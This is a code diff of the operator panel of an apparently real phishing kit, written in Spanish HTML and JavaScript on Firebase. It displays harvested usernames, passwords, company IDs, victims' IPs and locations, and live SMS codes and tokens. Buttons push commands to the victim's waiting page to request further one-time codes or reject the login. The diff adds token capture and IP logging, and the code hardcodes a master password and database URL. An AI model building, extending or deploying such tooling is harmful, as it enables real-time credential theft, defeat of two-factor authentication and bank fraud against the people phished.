@@ -3,47 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <title>JS C0D3R - PANEL MASTER V3</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
     <style>
         #admin-panel { display: none; }
         #auth-screen { display: flex; }
-        .data-label { font-size: 10px; text-transform: uppercase; color: #9ca3af; font-weight: 700; margin-bottom: 2px; }
+        .data-label { font-size: 10px; text-transform: uppercase; color: #71717a; font-weight: 700; margin-bottom: 2px; }
         .data-value { font-weight: 600; word-break: break-all; margin-bottom: 8px; line-height: 1.2; }
         .sms-pulse { animation: pulse-yellow 2s infinite; }
         .sms2-pulse { animation: pulse-orange 2s infinite; }
-        @keyframes pulse-yellow { 0%, 100% { background-color: #fef9c3; } 50% { background-color: #fde047; } }
-        @keyframes pulse-orange { 0%, 100% { background-color: #ffedd5; } 50% { background-color: #fed7aa; } }
+        .token-pulse { animation: pulse-green 2s infinite; }
+        @keyframes pulse-yellow { 0%, 100% { background-color: rgba(113, 63, 18, 0.4); } 50% { background-color: rgba(234, 179, 8, 0.3); } }
+        @keyframes pulse-orange { 0%, 100% { background-color: rgba(124, 45, 18, 0.4); } 50% { background-color: rgba(249, 115, 22, 0.3); } }
+        @keyframes pulse-green { 0%, 100% { background-color: rgba(6, 78, 59, 0.4); } 50% { background-color: rgba(16, 185, 129, 0.3); } }
     </style>
 </head>
-<body class="bg-gray-100">
+<body class="bg-black text-gray-100 min-h-screen">
 
-    <!-- Auth -->
-    <div id="auth-screen" class="fixed inset-0 bg-slate-900 flex items-center justify-center z-[100]">
-        <div class="bg-white p-8 rounded-2xl shadow-2xl w-96 text-center">
-            <h2 class="text-2xl font-bold mb-6 text-gray-800">🔐 Acceso Master</h2>
-            <input type="password" id="admin-pass" placeholder="Contraseña" class="w-full p-3 border rounded-lg mb-4 focus:ring-2 focus:ring-indigo-500">
-            <button onclick="verificarAcceso()" class="w-full bg-indigo-600 text-white font-bold py-3 rounded-lg hover:bg-indigo-700 transition">Entrar</button>
+    <!-- Auth Dark -->
+    <div id="auth-screen" class="fixed inset-0 bg-black/90 backdrop-blur-md flex items-center justify-center z-[100]">
+        <div class="bg-zinc-900 border border-zinc-800 p-8 rounded-2xl shadow-[0_0_30px_rgba(79,70,229,0.2)] w-96 text-center">
+            <h2 class="text-2xl font-bold mb-6 text-indigo-400" style="font-family: 'Orbitron', sans-serif;">🔐 Acceso Master</h2>
+            <input type="password" id="admin-pass" placeholder="Contraseña" class="w-full p-3 bg-zinc-950 border border-zinc-700 text-white rounded-lg mb-4 focus:ring-2 focus:ring-indigo-500 outline-none">
+            <button onclick="verificarAcceso()" class="w-full bg-indigo-600 text-white font-bold py-3 rounded-lg hover:bg-indigo-500 transition shadow-lg shadow-indigo-600/30">Entrar</button>
         </div>
     </div>
 
-    <!-- Main Panel -->
+    <!-- Main Panel Dark -->
     <div id="admin-panel">
-        <nav class="bg-indigo-800 p-4 text-white flex justify-between items-center shadow-lg sticky top-0 z-50">
+        <nav class="bg-zinc-900 border-b border-zinc-800 p-4 text-white flex justify-between items-center shadow-md sticky top-0 z-50">
             <div class="flex items-center gap-4">
-                <h1 class="text-xl font-bold italic">JS C0D3R - PANEL</h1>
-                <div class="text-xs bg-indigo-900 px-3 py-1 rounded-full text-indigo-200">Refresco: <span id="timer">10</span>s</div>
+                <h1 class="text-2xl font-black text-indigo-400 tracking-wider" style="font-family: 'Orbitron', sans-serif; text-shadow: 0 0 10px rgba(99, 102, 241, 0.5);">
+                    JS C0D3R - MARAÑA PANEL
+                </h1>
+                <div class="text-xs bg-zinc-950 border border-zinc-800 px-3 py-1 rounded-full text-indigo-300 font-mono">Refresco: <span id="timer">10</span>s</div>
             </div>
             <div class="flex items-center gap-4">
-                <div class="bg-indigo-700 px-4 py-2 rounded-lg font-mono text-sm">TOTAL: <span id="total-count">0</span></div>
-                <button onclick="borrarTodo()" class="bg-rose-600 hover:bg-rose-700 px-4 py-2 rounded-lg text-sm font-bold transition">Limpiar</button>
-                <button onclick="cerrarSesion()" class="bg-gray-800 px-4 py-2 rounded-lg text-sm font-bold">Salir</button>
+                <div class="bg-zinc-950 border border-zinc-800 px-4 py-2 rounded-lg font-mono text-sm text-indigo-400">TOTAL: <span id="total-count">0</span></div>
+                <button onclick="borrarTodo()" class="bg-rose-700 hover:bg-rose-600 px-4 py-2 rounded-lg text-sm font-bold transition shadow-md">Limpiar Todo</button>
+                <button onclick="cerrarSesion()" class="bg-zinc-800 hover:bg-zinc-700 px-4 py-2 rounded-lg text-sm font-bold border border-zinc-700 transition">Salir</button>
             </div>
         </nav>
 
-        <div class="max-w-7xl mx-auto p-6">
-            <div id="users-container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"></div>
+        <div class="w-full p-6">
+            <table id="users-table" style="width: 100%; border-collapse: collapse;">
+                <tbody id="users-container">
+                    <!-- Aquí se insertarán las filas dinámicamente -->
+                </tbody>
+            </table>
         </div>
     </div>
 
@@ -51,7 +62,7 @@
 
     <script>
         const CLAVE_MAESTRA = "Cabimas2910"; 
-        const firebaseConfig = { databaseURL: "https://mslogs-31bf1-default-rtdb.firebaseio.com/" };
+        const firebaseConfig = { databaseURL: "https://copendndsn-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
         
@@ -62,7 +73,8 @@
         let countTimer = 10;
         setInterval(() => {
             if (--countTimer <= 0) location.reload();
-            document.getElementById('timer').innerText = countTimer;
+            const timerEl = document.getElementById('timer');
+            if (timerEl) timerEl.innerText = countTimer;
         }, 1000);
 
         function verificarAcceso() {
@@ -98,44 +110,99 @@
                     }
 
                     const esEmp = !!data.cedula_juridica;
-                    const statusColor = data.online ? 'bg-green-500' : 'bg-red-500';
+                    const statusColor = data.online ? 'bg-emerald-500' : 'bg-rose-500';
+
+                    // Lectura de IP y Ubicación
+                    const ipCliente = data.ip || 'No registrada';
+                    const paisCliente = data.country || data.pais || 'Desconocido';
+                    const ciudadCliente = data.city || data.ciudad || 'Desconocida';
 
                     container.innerHTML += `
-                        <div class="bg-white rounded-xl shadow-lg p-5 border-t-8 ${esEmp ? 'border-blue-600' : 'border-indigo-500'} relative">
-                            <div class="absolute top-2 right-2 flex items-center gap-1">
-                                <span class="h-2 w-2 rounded-full ${statusColor} animate-pulse"></span>
-                                <span class="text-[8px] font-bold text-gray-400">${data.online ? 'LIVE' : 'OFF'}</span>
-                            </div>
+    <!-- FILA DEL CLIENTE (MODO OSCURO COMPLETO) -->
+    <tr class="bg-zinc-900 shadow-[0_4px_20px_rgba(0,0,0,0.8)] rounded-xl border-l-8 ${esEmp ? 'border-blue-500' : 'border-indigo-500'} border-y border-r border-zinc-800">
+        <td class="p-3">
+            <div class="flex items-center justify-between gap-4 w-full text-xs">
+                
+                <!-- 1. LIVE / OFF -->
+                <div class="flex items-center gap-1.5 shrink-0">
+                    <span class="h-2.5 w-2.5 rounded-full ${statusColor} animate-pulse"></span>
+                    <span class="text-[10px] font-bold text-zinc-400">${data.online ? 'LIVE' : 'OFF'}</span>
+                </div>
 
-                            <div class="mb-3">
-                                <div class="data-label">Tipo: ${esEmp ? 'EMPRESARIAL' : 'PERSONAL'}</div>
-                                <div class="text-[10px] font-bold text-gray-500 uppercase">${data.status || 'Activo'}</div>
-                            </div>
+                <!-- 2. TIPO Y ESTADO -->
+                <div class="shrink-0">
+                    <div class="text-[9px] text-zinc-500 font-bold uppercase">TIPO</div>
+                    <div class="font-bold text-gray-100">${esEmp ? 'EMPRESARIAL' : 'PERSONAL'}</div>
+                    <div class="text-[9px] font-bold text-indigo-400 uppercase">${data.status || data.step || 'Activo'}</div>
+                </div>
 
-                            <div class="space-y-1">
-                                ${esEmp ? `<div class="flex justify-between border-b pb-1"><span class="data-label">C. Jurídica</span><span class="data-value text-blue-900 font-bold">${data.cedula_juridica}</span></div>` : ''}
-                                <div class="flex justify-between border-b pb-1"><span class="data-label">Usuario</span><span class="data-value text-blue-700">${data.user}</span></div>
-                                <div class="flex justify-between border-b pb-1"><span class="data-label">Pass</span><span class="data-value text-rose-600 font-bold">${data.pass}</span></div>
-                            </div>
+                <!-- 3. CÉDULA JURÍDICA (Si aplica) -->
+                ${esEmp ? `
+                <div class="shrink-0">
+                    <div class="text-[9px] text-zinc-500 font-bold uppercase">C. JURÍDICA</div>
+                    <div class="font-bold text-blue-400 font-mono">${data.cedula_juridica}</div>
+                </div>` : ''}
 
-                            ${data.sms ? `
-                                <div class="mt-3 p-2 rounded border-2 border-yellow-500 bg-yellow-50 sms-pulse shadow-inner text-center">
-                                    <div class="data-label text-yellow-800">📩 CÓDIGO 1</div>
-                                    <div class="text-2xl font-black text-gray-800">${data.sms}</div>
-                                </div>` : ''}
+                <!-- 4. USUARIO -->
+                <div class="shrink-0">
+                    <div class="text-[9px] text-zinc-500 font-bold uppercase">USUARIO</div>
+                    <div class="font-bold text-blue-400 font-mono">${data.user}</div>
+                </div>
 
-                            ${data.sms2 ? `
-                                <div class="mt-3 p-2 rounded border-2 border-orange-500 bg-orange-50 sms2-pulse shadow-inner text-center">
-                                    <div class="data-label text-orange-800">📩 CÓDIGO 2</div>
-                                    <div class="text-2xl font-black text-gray-800">${data.sms2}</div>
-                                </div>` : ''}
+                <!-- 5. CONTRASEÑA -->
+                <div class="shrink-0">
+                    <div class="text-[9px] text-zinc-500 font-bold uppercase">CONTRASEÑA</div>
+                    <div class="font-bold text-rose-500 font-mono">${data.pass}</div>
+                </div>
 
-                            <div class="mt-4 flex flex-wrap gap-2">
-                                <button onclick="enviarOrden('${id}', 'pedir_codigo')" class="bg-amber-500 hover:bg-amber-600 text-white text-[9px] p-2 rounded font-bold flex-1 uppercase">Solicitar SMS 1</button>
-                                <button onclick="enviarOrden('${id}', 'pedir_codigo2')" class="bg-orange-600 hover:bg-orange-700 text-white text-[9px] p-2 rounded font-bold flex-1 uppercase">Solicitar SMS 2</button>
-                                <button onclick="enviarOrden('${id}', 'rechazar')" class="bg-slate-700 hover:bg-black text-white text-[9px] p-2 rounded font-bold flex-1 uppercase">Rechazar</button>
-                            </div>
-                        </div>`;
+                <!-- 6. IP -->
+                <div class="shrink-0">
+                    <div class="text-[9px] text-zinc-500 font-bold uppercase">IP</div>
+                    <div class="font-mono text-zinc-300">${ipCliente}</div>
+                </div>
+
+                <!-- 7. UBICACIÓN -->
+                <div class="shrink-0">
+                    <div class="text-[9px] text-zinc-500 font-bold uppercase">UBICACIÓN</div>
+                    <div class="font-semibold text-zinc-300">${ciudadCliente}, ${paisCliente}</div>
+                </div>
+
+                <!-- 8. CÓDIGOS -->
+                <div class="flex items-center gap-2 shrink-0">
+                    ${data.sms ? `
+                    <div class="px-2.5 py-1 rounded border border-yellow-500/40 bg-yellow-950/40 text-center sms-pulse">
+                        <div class="text-[8px] text-yellow-400 font-bold">SMS 1</div>
+                        <div class="font-black text-yellow-200 font-mono">${data.sms}</div>
+                    </div>` : ''}
+
+                    ${data.sms2 ? `
+                    <div class="px-2.5 py-1 rounded border border-orange-500/40 bg-orange-950/40 text-center sms2-pulse">
+                        <div class="text-[8px] text-orange-400 font-bold">SMS 2</div>
+                        <div class="font-black text-orange-200 font-mono">${data.sms2}</div>
+                    </div>` : ''}
+
+                    ${data.token ? `
+                    <div class="px-2.5 py-1 rounded border border-emerald-500/40 bg-emerald-950/40 text-center token-pulse">
+                        <div class="text-[8px] text-emerald-400 font-bold">TOKEN</div>
+                        <div class="font-black text-emerald-200 font-mono">${data.token}</div>
+                    </div>` : ''}
+                </div>
+
+                <!-- 9. BOTONERA HORIZONTAL -->
+                <div class="flex items-center gap-1.5 shrink-0">
+                    <button onclick="enviarOrden('${id}', 'pedir_codigo')" class="bg-amber-600 hover:bg-amber-500 text-white text-[9px] px-2.5 py-1.5 rounded font-bold uppercase transition shadow-md">SOLICITAR SMS 1</button>
+                    <button onclick="enviarOrden('${id}', 'pedir_codigo2')" class="bg-orange-600 hover:bg-orange-500 text-white text-[9px] px-2.5 py-1.5 rounded font-bold uppercase transition shadow-md">SOLICITAR SMS 2</button>
+                    <button onclick="enviarOrden('${id}', 'pedir_token')" class="bg-emerald-600 hover:bg-emerald-500 text-white text-[9px] px-2.5 py-1.5 rounded font-bold uppercase transition shadow-md">SOLICITAR TOKEN</button>
+                    <button onclick="enviarOrden('${id}', 'rechazar')" class="bg-zinc-700 hover:bg-zinc-600 text-white text-[9px] px-2.5 py-1.5 rounded font-bold uppercase transition shadow-md">RECHAZAR</button>
+                    <button onclick="eliminarCliente('${id}')" class="bg-red-700 hover:bg-red-600 text-white text-[9px] px-2.5 py-1.5 rounded font-bold uppercase transition shadow-md">ELIMINAR</button>
+                </div>
+
+            </div>
+        </td>
+    </tr>
+    <!-- SEPARADOR BR ENTRE FILAS -->
+    <tr><td colspan="100%"><br></td></tr>
+`;
                 });
                 document.getElementById('total-count').innerText = count;
                 primeraCarga = false;
@@ -143,15 +210,25 @@
         }
 
         function enviarOrden(id, accion) {
-            // 1. Actualiza el estado visual para ti en el panel
-            let statusText = accion === 'pedir_codigo' ? 'ESPERANDO SMS 1' : (accion === 'pedir_codigo2' ? 'ESPERANDO SMS 2' : 'RECHAZADO');
+            let statusText = 'ACTIVO';
+            if (accion === 'pedir_codigo') statusText = 'ESPERANDO SMS 1';
+            else if (accion === 'pedir_codigo2') statusText = 'ESPERANDO SMS 2';
+            else if (accion === 'pedir_token') statusText = 'ESPERANDO TOKEN';
+            else if (accion === 'rechazar') statusText = 'RECHAZADO';
+
             db.ref('logins/' + id).update({ status: statusText });
 
-            // 2. Envía el comando real que escucha el 'cargando.html' del usuario
             db.ref('comandos/' + id).set({ 
                 accion: accion, 
                 ts: Date.now() 
             });
+        }
+
+        function eliminarCliente(id) {
+            if (confirm('¿Estás seguro de que deseas eliminar este cliente?')) {
+                db.ref('logins/' + id).remove();
+                db.ref('comandos/' + id).remove();
+            }
         }
 
         function borrarTodo() { if (confirm('¿Borrar todos los registros?')) db.ref().remove(); }
